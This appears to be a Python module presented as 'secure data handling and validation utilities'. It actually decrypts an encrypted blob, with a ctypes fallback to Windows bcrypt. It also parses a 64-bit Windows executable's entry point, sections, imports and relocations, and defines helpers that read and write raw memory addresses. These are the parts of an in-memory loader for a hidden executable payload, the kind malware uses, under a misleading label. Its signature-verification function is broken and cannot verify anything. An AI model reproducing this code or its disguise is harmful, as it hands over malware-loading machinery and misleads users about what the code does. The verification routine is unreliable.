# -*- coding: utf-8 -*-
"""
Secure data handling and validation utilities.
"""
import hashlib
import struct
import hmac
import ctypes


def generate_signature(nonce, ts, secret):
    msg = (nonce + str(ts)).encode()
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()


def verify_signature(key, message, expected):
    computed = generate_signature(key, message, expected)
    return hmac.compare_digest(computed, expected)


def decode_blob(key_hex, data_b64):
    try:
        return _decode_primary(key_hex, data_b64)
    except Exception:
        return _decode_fallback(key_hex, data_b64)


def _decode_primary(key_hex, data_b64):
    import base64
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    return AESGCM(key).decrypt(raw[:12], raw[12:], None)


def _decode_fallback(key_hex, data_b64):
    import base64
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    iv, tag, ct = raw[:12], raw[-16:], raw[12:-16]
    lib = ctypes.WinDLL("bcrypt")
    alg = "AES\0".encode("utf-16-le")
    mode_p = "ChainingMode\0".encode("utf-16-le")
    mode_v = "ChainingModeGCM\0".encode("utf-16-le")
    h_alg = ctypes.c_void_p()
    lib.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), alg, None, 0)
    lib.BCryptSetProperty(h_alg, mode_p, mode_v, len(mode_v), 0)
    h_key = ctypes.c_void_p()
    lib.BCryptGenerateSymmetricKey(
        h_alg, ctypes.byref(h_key), None, 0,
        ctypes.c_char_p(key), len(key), 0)

    class _Params(ctypes.Structure):
        _fields_ = [
            ("sz", ctypes.c_ulong), ("v", ctypes.c_ulong),
            ("p1", ctypes.c_void_p), ("n1", ctypes.c_ulong),
            ("p2", ctypes.c_void_p), ("n2", ctypes.c_ulong),
            ("p3", ctypes.c_void_p), ("n3", ctypes.c_ulong),
            ("p4", ctypes.c_void_p), ("n4", ctypes.c_ulong),
            ("x1", ctypes.c_ulong), ("x2", ctypes.c_ulonglong),
            ("fl", ctypes.c_ulong),
        ]

    iv_buf = ctypes.create_string_buffer(iv)
    tag_buf = ctypes.create_string_buffer(tag)
    params = _Params()
    params.sz = ctypes.sizeof(params)
    params.v = 1
    params.p1 = ctypes.cast(iv_buf, ctypes.c_void_p)
    params.n1 = 12
    params.p3 = ctypes.cast(tag_buf, ctypes.c_void_p)
    params.n3 = 16
    ct_buf = ctypes.create_string_buffer(ct)
    pt_buf = ctypes.create_string_buffer(len(ct))
    out_len = ctypes.c_ulong(0)
    status = lib.BCryptDecrypt(
        h_key, ct_buf, len(ct), ctypes.byref(params),
        None, 0, pt_buf, len(ct), ctypes.byref(out_len), 0)
    lib.BCryptDestroyKey(h_key)
    lib.BCryptCloseAlgorithmProvider(h_alg, 0)
    if status != 0:
        return None
    return pt_buf.raw[:out_len.value]


def _field(buf, off, fmt):
    return struct.unpack_from(fmt, buf, off)[0]


def _rd(addr, fmt):
    sz = struct.calcsize(fmt)
    return struct.unpack_from(
        fmt, (ctypes.c_char * sz).from_address(addr), 0)[0]


def _wr(addr, fmt, val):
    sz = struct.calcsize(fmt)
    struct.pack_into(
        fmt, (ctypes.c_char * sz).from_address(addr), 0, val)


def analyze_data(data):
    """Analyze binary data structure and extract layout parameters."""
    if len(data) < 256 or struct.unpack_from("<H", data, 0)[0] != 0x5A4D:
        return None
    pe = _field(data, 0x3C, "<I")
    if pe + 4 > len(data) or _field(data, pe, "<I") != 0x4550:
        return None
    fh = pe + 4
    nsec = _field(data, fh + 2, "<H")
    opt_sz = _field(data, fh + 16, "<H")
    oh = fh + 20
    if _field(data, oh, "<H") != 0x20B:
        return None
    ndd = _field(data, oh + 108, "<I")
    dd = oh + 112
    secs = []
    so = oh + opt_sz
    for i in range(nsec):
        p = so + i * 40
        secs.append((
            _field(data, p + 8, "<I"), _field(data, p + 12, "<I"),
            _field(data, p + 16, "<I"), _field(data, p + 20, "<I"),
            _field(data, p + 36, "<I"),
        ))
    return {
        "e": _field(data, oh + 16, "<I"),
        "b": _field(data, oh + 24, "<Q"),
        "s": _field(data, oh + 56, "<I"),
        "h": _field(data, oh + 60, "<I"),
        "i": _field(data, dd + 8, "<I") if ndd > 1 else 0,
        "r": _field(data, dd + 40, "<I") if ndd > 5 else 0,
        "z": _field(data, dd + 44, "<I") if ndd > 5 else 0,
        "c": secs,
    }
